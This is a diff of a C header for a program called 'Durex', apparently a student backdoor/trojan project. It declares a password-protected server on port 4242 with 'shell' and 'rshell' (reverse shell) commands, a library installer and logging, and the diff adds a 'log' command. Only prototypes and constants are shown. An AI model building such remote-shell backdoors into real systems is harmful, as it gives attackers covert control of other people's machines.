@@ -24,16 +24,16 @@
 #include <netdb.h>
 
 # define SERVER_REPORTER	"/var/log/Durex.log"
-# define SERVER_ADDR		"localhost"
 # define SERVER_PORT		"4242"
 # define SERVER_REMOTE_PORT	"2121"
 # define SERVER_CLIENT_MAX	3
 # define SERVER_CLIENT_BUFF	128
-# define SERVER_COMMANDS	{ "?", "Display this help.", &serverHelp, NULL }, \
-							{ "shell", "Open a shell.", &serverShell, NULL }, \
-							{ "rshell", "Open a reverse shell on port "SERVER_PORT" or specify it.", &serverRemoteShell, NULL }, \
-							{ "quit", "Quit server.", &serverQuitClient, NULL }, \
-							{ NULL, NULL, NULL, NULL }
+# define SERVER_COMMANDS	{ "?"     , NULL    , "Display this help."   , &serverHelp       , NULL },\
+							{ "shell" , NULL    , "Open a shell."        , &serverShell      , NULL },\
+							{ "rshell", "[port]", "Open a reverse shell.", &serverRemoteShell, NULL },\
+							{ "log"   , NULL    , "Print logs"           , &serverPrintLogs  , NULL },\
+							{ "quit"  , NULL    , "Quit server."         , &serverQuitClient , NULL },\
+							{ NULL, NULL, NULL, NULL, NULL }
 # define SERVER_PASS		201, 121, 30, 74, 3, 83, 154, 250 /* kata */
 
 typedef struct	s_buff
@@ -67,15 +67,14 @@ typedef struct	s_sv
 typedef struct	s_cmd
 {
 	char		*name;
+	char		*options;
 	char		*def;
 	void		(*func)(t_cl *, struct s_cmd *);
-	char		*options;
+	char		*opt;
 }				t_cmd;
 
 void			print_usr_name();
 int				install_library();
-void			check_library();
-void			uninstall_library();
 
 int				openServer(const char *addr, const char *port);
 void			serverAcceptConnections();
@@ -88,19 +87,20 @@ int				spawnShell();
 void			serverReadClientShell(t_cl *client);
 void			serverQuitClientShell(t_cl *client, t_cmd *cmds);
 void			serverRemoteShell(t_cl *client, t_cmd *cmds);
+void			serverPrintLogs(t_cl *client, t_cmd *cmds);
 void			serverQuitClient(t_cl *client, t_cmd *cmds);
 void			quitClearlyServer();
 void			clearClient(t_cl *client);
 void			serverShellSpawned(char *buff, t_cl *client);
 
 void			clientRead(char *buff, int size, t_cl *client);
-void			clientWrite(char *str, t_cl *client);
+void			clientWrite(const char *str, t_cl *client);
 void			clientShell(int fds);
 
 int				hireReporter();
 void			serverLog(const char *message, ...);
 
-void			encryptFunction(u_char *msg, size_t size);
+void			encryptFunction(unsigned char *msg, size_t size);
 char			*moveTail(char *ptr, char *buff, int buff_size);
 
 int				mystrlen(const char *s1);
